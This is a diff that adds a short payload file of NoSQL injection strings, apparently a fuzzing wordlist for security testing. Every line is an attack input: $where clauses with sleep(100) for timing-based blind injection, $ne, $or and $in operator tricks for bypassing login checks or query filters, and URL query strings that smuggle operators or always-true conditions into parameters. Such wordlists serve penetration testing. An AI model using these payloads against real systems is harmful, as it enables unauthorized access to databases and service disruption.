@@ -1,0 +1,11 @@
+'"\/$[].>
+{"$where":  "sleep(100)"}
+;sleep(100);
+{"$ne": -1}
+{"$in": []}
+{"$and": [ {"id": 5}, {"id": 6} ]}
+{"$where":  "return true"}
+{"$or": [{},{"foo":"1"}]}
+site.com/page?query=term || '1'=='1
+site.com/page?user[$ne]=nobody
+site.com/page?user=;return true
